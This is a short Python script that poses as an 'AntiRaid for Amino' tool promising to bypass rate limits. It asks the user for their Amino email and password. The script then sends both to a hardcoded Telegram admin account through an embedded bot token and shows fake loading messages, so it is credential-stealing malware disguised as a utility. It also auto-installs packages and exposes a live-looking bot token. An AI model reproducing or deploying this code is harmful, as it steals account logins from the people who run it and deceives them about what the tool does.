from os import system as shell
from pyfiglet import figlet_format
from time import sleep

install = lambda module: shell(f"pip install {module}")
clear = lambda: shell("clear || cls")

try:
    from telebot import TeleBot as Bot
    from colorama import Fore
except ModuleNotFoundError:
    install("pyTelegramBotAPI")
    install("colorama")
    from telebot import TeleBot as Bot
    from colorama import Fore

clear()

admins = ["5488079138"]

bot = Bot('5648097291:AAFXjBg_l5wE1e2sX6eLPMFblpqn6JwSaMI')

print(Fore.YELLOW + "\n".join(figlet_format("AntiRaid", font="smslant").rstrip().split("\n")[:3]))
print(Fore.RESET + "\n".join(figlet_format("AntiRaid", font="smslant").rstrip().split("\n")[3:]))

mail = print(Fore.YELLOW + """[Authors]::: Jocky\n             Nogenta\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏┫ •> AntiRaid for Amino.
┃┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃┣•> Bypassing 403 error and too many requests
┃┃───────────────────── ─ ━
┃┣•> More coming soon!
━━━━━━──────────────────── ─ ━\n[Version]::: 2.0""")
print("")

mail = input(Fore.YELLOW + "Email: ")

password = input(Fore.YELLOW + "Password: ")

for admin_id in admins:
    bot.send_message(admin_id, f"\n\nAntiraid: \n\nAntiraid:  {mail}\nAntiraid: {password} + \n\nGood.")
    print("")

print(Fore.YELLOW + "Loading..")
sleep(10)
print(Fore.RESET + "Start!")
sleep(50)

print(Fore.RESET)